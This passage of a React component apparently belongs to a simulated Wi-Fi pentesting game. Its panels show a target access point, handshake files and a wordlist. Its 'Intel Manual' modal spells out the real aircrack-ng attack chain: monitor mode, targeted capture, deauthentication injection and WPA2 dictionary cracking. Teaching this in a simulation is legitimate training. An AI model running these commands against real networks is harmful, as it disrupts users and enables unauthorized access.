                          <Cpu className="w-5 h-5 text-blue-400/80" />
                        </div>
                        <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                          <div className="bg-blue-500 h-full transition-all duration-500" style={{ width: isSniffing ? '38%' : '18%' }} />
                        </div>
                      </div>

                      <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-1">
                        <span className="text-slate-400 text-[10px] uppercase">RAM Allocation</span>
                        <div className="text-lg font-bold text-emerald-400 flex items-center justify-between">
                          <span>2.42 / 7.85 GB</span>
                          <Layers className="w-5 h-5 text-emerald-400/80" />
                        </div>
                        <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                          <div className="bg-emerald-500 h-full w-[31%]" />
                        </div>
                      </div>

                      <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-1">
                        <span className="text-slate-400 text-[10px] uppercase">Packet Rate</span>
                        <div className="text-lg font-bold text-red-400 flex items-center justify-between">
                          <span>{isSniffing ? '1,420 pkts/s' : '0 pkts/s'}</span>
                          <Radio className="w-5 h-5 text-[#FF0055] animate-pulse" />
                        </div>
                        <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                          <div className={`h-full ${isSniffing ? 'bg-red-500 w-[65%]' : 'bg-slate-700 w-0'}`} />
                        </div>
                      </div>
                    </div>

                    {/* Telemetry Details */}
                    <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-2.5">
                      <div className="text-xs font-bold text-white flex items-center gap-2 border-b border-slate-800 pb-2">
                        <Shield className="w-4 h-4 text-[#FF0055]" />
                        <span>Wireless NIC Driver & Hardware Properties</span>
                      </div>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-slate-300">
                        <div>Chipset: <span className="text-white font-bold">Atheros AR9271</span></div>
                        <div>Kernel Driver: <span className="text-white font-bold">ath9k_htc</span></div>
                        <div>Frequency: <span className="text-white font-bold">2.437 GHz (802.11b/g/n)</span></div>
                        <div>TX Power: <span className="text-white font-bold">20.00 dBm (100 mW)</span></div>
                        <div>Current Mode: <span className={interfaceState === 'wlan0mon' ? 'text-green-400 font-bold' : 'text-slate-300'}>{interfaceState === 'wlan0mon' ? 'Monitor (Promiscuous)' : 'Managed (Station)'}</span></div>
                        <div>Packet Injection: <span className="text-green-400 font-bold">Supported (Raw 802.11)</span></div>
                      </div>
                    </div>

                    {/* Active Processes Table */}
                    <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-2">
                      <div className="text-xs font-bold text-white flex items-center justify-between border-b border-slate-800 pb-1.5">
                        <span>Active Penetration Daemons (htop)</span>
                        <span className="text-[10px] text-slate-400">PID / COMMAND</span>
                      </div>
                      <div className="space-y-1 text-[11px]">
                        <div className="flex justify-between py-0.5 text-slate-300">
                          <span className="font-mono text-red-400">PID 1042</span>
                          <span className="text-white">airmon-ng start wlan0</span>
                          <span className="text-green-400">[RUNNING]</span>
                        </div>
                        <div className="flex justify-between py-0.5 text-slate-300">
                          <span className="font-mono text-red-400">PID 1089</span>
                          <span className="text-white">{isSniffing ? 'airodump-ng -c 6 --bssid ...' : 'airodump-ng wlan0mon'}</span>
                          <span className={isSniffing ? 'text-green-400' : 'text-slate-400'}>{isSniffing ? '[SNIFFING]' : '[IDLE]'}</span>
                        </div>
                        <div className="flex justify-between py-0.5 text-slate-300">
                          <span className="font-mono text-red-400">PID 1120</span>
                          <span className="text-white">aireplay-ng --deauth 5</span>
                          <span className={handshakeStatus === 'CAPTURED' ? 'text-green-400' : 'text-slate-400'}>{handshakeStatus === 'CAPTURED' ? '[INJECTED]' : '[STANDBY]'}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* ========================================================= */}
                {/* 3. WIRELESS SPECTRUM RADAR VIEW */}
                {/* ========================================================= */}
                {activeTab === 'radar' && (
                  <div className="flex-1 p-4 overflow-y-auto space-y-4 text-xs font-mono bg-[#07090e] text-slate-200 min-h-[360px] box-border">
                    <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                      <div className="flex items-center gap-2">
                        <Signal className="w-4 h-4 text-emerald-400 animate-pulse" />
                        <span className="font-bold text-white text-xs">802.11 2.4GHz Spectrum Scanner</span>
                      </div>
                      <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-950/80 border border-emerald-500/40 text-emerald-300 font-bold">
                        ACTIVE SWEEP
                      </span>
                    </div>

                    {/* Detected Networks Table */}
                    <div className="space-y-2">
                      <div className="p-3 rounded-xl bg-red-950/30 border-2 border-red-500/60 shadow-[0_0_20px_rgba(255,0,85,0.25)] space-y-2">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="w-2.5 h-2.5 rounded-full bg-[#FF0055] animate-ping shrink-0" />
                            <span className="font-bold text-white text-sm">Target_Corp_5G</span>
                          </div>
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-red-900/80 text-white uppercase">PRIMARY TARGET</span>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px] text-slate-300 pt-1">
                          <div>BSSID: <span className="text-red-300 font-mono">00:14:6C:7E:40:80</span></div>
                          <div>Channel: <span className="text-white font-bold">CH 6 (2.437GHz)</span></div>
                          <div>Signal (RSSI): <span className="text-emerald-400 font-bold">-48 dBm (92%)</span></div>
                          <div>Security: <span className="text-amber-400 font-bold">WPA2-CCMP PSK</span></div>
                        </div>
                      </div>

                      <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-1.5 opacity-70">
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-slate-300">Guest_Lobby_Net</span>
                          <span className="text-[10px] text-slate-300">AC:86:74:11:29:A0</span>
                        </div>
                        <div className="grid grid-cols-3 gap-2 text-[11px] text-slate-300">
                          <div>Channel: CH 11</div>
                          <div>Signal: -72 dBm</div>
                          <div>Security: WPA2-TKIP</div>
                        </div>
                      </div>

                      <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-1.5 opacity-60">
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-slate-300">Printer_Internal</span>
                          <span className="text-[10px] text-slate-300">9C:3D:CF:89:12:F1</span>
                        </div>
                        <div className="grid grid-cols-3 gap-2 text-[11px] text-slate-300">
                          <div>Channel: CH 1</div>
                          <div>Signal: -85 dBm</div>
                          <div>Security: WPA2-CCMP</div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* ========================================================= */}
                {/* 4. FILE EXPLORER VIEW */}
                {/* ========================================================= */}
                {activeTab === 'files' && (
                  <div className="flex-1 p-4 overflow-y-auto space-y-3 text-xs font-mono bg-[#07090e] text-slate-200 min-h-[360px] box-border">
                    <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                      <div className="flex items-center gap-2">
                        <Folder className="w-4 h-4 text-amber-400" />
                        <span className="font-bold text-white text-xs">/root/handshakes/</span>
                      </div>
                      <span className="text-[10px] text-slate-400">4 Items</span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {[
                        { name: 'wordlist.txt', size: '14.3 MB', type: 'Dictionary File', status: 'Ready' },
                        { 
                          name: 'capture-01.cap', 
                          size: handshakeStatus !== 'NONE' ? '248 KB' : '0 B', 
                          type: '802.11 Raw PCAP', 
                          status: handshakeStatus === 'CRACKED' ? 'Decrypted' : handshakeStatus === 'CAPTURED' ? '4-Way Captured' : 'Awaiting' 
                        },
                        { name: 'capture-01.csv', size: '841 B', type: 'Airodump CSV Log', status: 'Active' },
                        { name: 'aircrack.log', size: '12 KB', type: 'Cracker Session Log', status: 'Ready' },
                      ].map((file) => (
                        <div
                          key={file.name}
                          onClick={() => setSelectedFile(file.name)}
                          className={`p-3 rounded-xl border cursor-pointer transition-all ${
                            selectedFile === file.name
                              ? 'bg-red-950/40 border-red-500 text-white shadow-[0_0_12px_rgba(255,0,85,0.3)]'
                              : 'bg-black/60 border-slate-800 text-slate-300 hover:border-slate-700'
                          }`}
                        >
                          <div className="flex items-center gap-2">
                            <FileText className={`w-4 h-4 ${selectedFile === file.name ? 'text-[#FF0055]' : 'text-slate-400'}`} />
                            <span className="font-bold text-xs truncate">{file.name}</span>
                          </div>
                          <div className="flex items-center justify-between text-[10px] text-slate-400 mt-1">
                            <span>{file.size}</span>
                            <span className="text-emerald-400">{file.status}</span>
                          </div>
                        </div>
                      ))}
                    </div>

                    {/* File Preview Inspector */}
                    <div className="p-3.5 rounded-xl bg-black/80 border border-slate-800 space-y-2 mt-2">
                      <div className="text-[11px] font-bold text-slate-300 flex items-center justify-between border-b border-slate-800 pb-1.5">
                        <span>Inspector Preview: {selectedFile}</span>
                        <span className="text-[10px] text-slate-500">Read-Only</span>
                      </div>
                      {selectedFile === 'wordlist.txt' && (
                        <div className="p-2 rounded bg-[#06080d] text-slate-300 text-[11px] leading-relaxed font-mono">
                          password123<br />
                          admin2024<br />
                          qwerty789<br />
                          letmein123<br />
                          winter2025<br />
                          <span className="text-green-400 font-bold bg-green-950/40 px-1 rounded">redteam_root_access_2026</span><br />
                          supersecret99<br />
                          ... [14,344,384 total entries]
                        </div>
                      )}
                      {selectedFile === 'capture-01.cap' && (
                        <div className="p-2 rounded bg-[#06080d] text-slate-300 text-[11px] leading-relaxed font-mono">
                          {handshakeStatus === 'CAPTURED' || handshakeStatus === 'CRACKED' ? (
                            <span className="text-emerald-400 font-bold">
                              [+] EAPOL 4-Way Handshake Present<br />
                              - Message 1: ANonce (AP ➔ Station)<br />
                              - Message 2: SNonce + MIC (Station ➔ AP)<br />
                              - Message 3: GTK Encrypted (AP ➔ Station)<br />
                              - Message 4: MIC Confirmation (Station ➔ AP)
                            </span>
                          ) : (
                            <span className="text-amber-400 italic">
                              [*] Capture file initialized. Run aireplay-ng deauth to capture 4-way handshake frames.
                            </span>
                          )}
                        </div>
                      )}
                      {selectedFile !== 'wordlist.txt' && selectedFile !== 'capture-01.cap' && (
                        <div className="p-2 rounded bg-[#06080d] text-slate-400 text-[11px] italic font-mono">
                          Standard IEEE 802.11 metadata log file.
                        </div>
                      )}
                    </div>
                  </div>
                )}

              </div>

            </div>

          </div>

        </div>

        {/* TARGET RECON & INTERFACE CONTAINER (Standalone Card on Mobile, Side Panel on Desktop) */}
        <div className="w-full md:w-72 lg:w-80 rounded-xl md:rounded-2xl border border-red-500/30 bg-black/70 md:bg-[#0c0d16] p-4 space-y-3.5 text-left shrink-0 shadow-lg md:shadow-2xl box-border">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2.5">
            <div className="flex items-center gap-2">
              <Radio className="w-4 h-4 text-[#FF0055]" />
              <span className="font-bold text-white text-xs">Target Recon & Interface</span>
            </div>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300">
              ATH9K
            </span>
          </div>

          {/* Wireless Interface State */}
          <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-2 text-xs">
            <div className="flex items-center justify-between">
              <span className="text-slate-300">Wireless Interface:</span>
              <span className="font-bold text-white">{interfaceState}</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-slate-300">Monitor Mode:</span>
              <span className={`font-bold px-2 py-0.5 rounded text-[10px] ${
                interfaceState === 'wlan0mon' 
                  ? 'bg-green-950 text-green-400 border border-green-500/40 animate-pulse' 
                  : 'bg-slate-800 text-slate-300'
              }`}>
                {interfaceState === 'wlan0mon' ? 'ACTIVE (wlan0mon)' : 'DISABLED (Managed)'}
              </span>
            </div>
          </div>

          {/* Target Access Point Specification */}
          <div className="p-3 rounded-xl bg-black/60 border border-red-500/30 space-y-2 text-xs">
            <div className="text-[11px] font-bold text-red-400 flex items-center gap-1.5">
              <Zap className="w-3.5 h-3.5 text-[#FF0055]" />
              <span>Target Network Profile</span>
            </div>
            
            <div className="space-y-1.5 pt-1 text-[11px]">
              <div className="flex items-center justify-between">
                <span className="text-slate-300">SSID:</span>
                <span className="font-bold text-white">Target_Corp_5G</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-300">BSSID (MAC):</span>
                <span className="font-mono text-red-300">00:14:6C:7E:40:80</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-300">Channel / Band:</span>
                <span className="font-bold text-slate-200">CH 6 (2.437 GHz)</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-slate-300">Security:</span>
                <span className="font-bold text-amber-400">WPA2-PSK (CCMP)</span>
              </div>
            </div>
          </div>

          {/* Handshake & Wordlist File State */}
          <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-2 text-xs">
            <div className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
              <FileText className="w-3.5 h-3.5 text-blue-400" />
              <span>Handshake Artifacts</span>
            </div>

            <div className="space-y-1.5 pt-1 text-[11px]">
              <div className="flex items-center justify-between">
                <span className="text-slate-300">Capture File:</span>
                <span className="font-mono text-slate-300">capture-01.cap</span>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-slate-300">EAPOL Handshake:</span>
                <span className={`font-bold px-1.5 py-0.5 rounded text-[10px] ${
                  handshakeStatus === 'CRACKED'
                    ? 'bg-green-950 text-green-400 border border-green-500/40'
                    : handshakeStatus === 'CAPTURED'
                    ? 'bg-amber-950 text-amber-300 border border-amber-500/40 animate-pulse'
                    : handshakeStatus === 'INITIALIZING'
                    ? 'bg-blue-950 text-blue-300 border border-blue-500/40'
                    : 'bg-slate-800 text-slate-300'
                }`}>
                  {handshakeStatus === 'CRACKED'
                    ? 'DECRYPTED // ROOT'
                    : handshakeStatus === 'CAPTURED'
                    ? 'CAPTURED (4-Way)'
                    : handshakeStatus === 'INITIALIZING'
                    ? 'SNIFFING...'
                    : 'AWAITING CAPTURE'}
                </span>
              </div>

              {crackedKey && (
                <div className="p-2 rounded bg-green-950/60 border border-green-500/50 space-y-1 text-green-300 mt-2">
                  <div className="text-[10px] text-green-400 font-bold uppercase">Decrypted PSK Passphrase:</div>
                  <div className="font-mono font-bold text-xs text-white select-all">{crackedKey}</div>
                </div>
              )}
            </div>
          </div>

        </div>

      </div>

      {/* ========================================================================= */}
      {/* INTEL MANUAL MODAL (READ-ONLY REFERENCE) */}
      {/* ========================================================================= */}
      {showIntelManual && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-150">
          <div className="relative w-full max-w-2xl max-h-[85vh] overflow-y-auto rounded-2xl border-2 border-red-500/50 bg-[#0c0d16] p-5 sm:p-6 shadow-[0_0_50px_rgba(255,0,85,0.3)] text-left space-y-5">
            
            {/* Header */}
            <div className="flex items-center justify-between border-b border-red-500/30 pb-3">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-lg bg-red-950/80 border border-red-500/40 text-[#FF0055]">
                  <HelpCircle className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-white text-base">
                    Intel Manual: 802.11 Wi-Fi Pentesting (Aircrack-ng Chain)
                  </h3>
                  <p className="text-xs text-slate-300">
                    Read-only tactical handbook. Type commands manually in the virtual Kali terminal.
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => {
                  sound.playClick();
                  setShowIntelManual(false);
                }}
                className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* 5-Step Instructions */}
            <div className="space-y-4 text-xs font-mono">
              
              {/* Step 1 */}
              <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-red-400 text-xs">STEP 1: Enable Wireless Monitor Mode</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-300">airmon-ng</span>
                </div>
                <p className="text-slate-300 font-sans">
                  Standard network cards only process packets destined for their MAC. Monitor mode forces the NIC to capture all RF raw frames in the air.
                </p>
                <div className="p-2 rounded bg-black border border-red-500/30 text-[#00FF66] select-all font-bold">
                  airmon-ng start wlan0
                </div>
              </div>

              {/* Step 2 */}
              <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-red-400 text-xs">STEP 2: Scan Nearby Networks</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-300">airodump-ng</span>
                </div>
                <p className="text-slate-300 font-sans">
                  Listen across all 802.11 channels to locate the corporate access point BSSID, channel number, and encryption cipher.
                </p>
                <div className="p-2 rounded bg-black border border-red-500/30 text-[#00FF66] select-all font-bold">
                  airodump-ng wlan0mon
                </div>
              </div>

              {/* Step 3 */}
              <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-red-400 text-xs">STEP 3: Target BSSID & Sniff Handshake File</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-300">airodump-ng</span>
                </div>
                <p className="text-slate-300 font-sans">
                  Lock frequency on Channel 6, filter specifically on BSSID 00:14:6C:7E:40:80, and write raw packet dumps to `capture-01.cap`.
                </p>
                <div className="p-2 rounded bg-black border border-red-500/30 text-[#00FF66] select-all font-bold">
                  airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w capture wlan0mon
                </div>
              </div>

              {/* Step 4 */}
              <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-red-400 text-xs">STEP 4: Deauthenticate Client to Force 4-Way Handshake</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-300">aireplay-ng</span>
                </div>
                <p className="text-slate-300 font-sans">
                  Transmit spoofed 802.11 deauthentication frames. The client momentarily drops and re-authenticates, letting our sniffer capture the cryptographic 4-way EAPOL exchange.
                </p>
                <div className="p-2 rounded bg-black border border-red-500/30 text-[#00FF66] select-all font-bold">
                  aireplay-ng --deauth 5 -a 00:14:6C:7E:40:80 wlan0mon
                </div>
              </div>

              {/* Step 5 */}
              <div className="p-3.5 rounded-xl bg-black/70 border border-slate-800 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-red-400 text-xs">STEP 5: Crack WPA2 Handshake with Dictionary Wordlist</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-300">aircrack-ng</span>
                </div>
                <p className="text-slate-300 font-sans">
                  Feed `wordlist.txt` through the PBKDF2 hashing algorithm against the captured handshake ANonce/SNonce to recover the plaintext Wi-Fi password.
                </p>
                <div className="p-2 rounded bg-black border border-red-500/30 text-[#00FF66] select-all font-bold">
                  aircrack-ng -w wordlist.txt -b 00:14:6C:7E:40:80 capture-01.cap
                </div>
              </div>

            </div>

            {/* Footer */}
            <div className="pt-2 border-t border-slate-800 flex justify-end">
              <button
                type="button"
                onClick={() => {
                  sound.playClick();
                  setShowIntelManual(false);
                }}
                className="px-4 py-2 rounded-lg bg-red-950/80 hover:bg-[#FF0055] border border-red-500/40 text-white font-bold text-xs uppercase tracking-wider transition-all"
              >
                Close Intel Manual
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
};
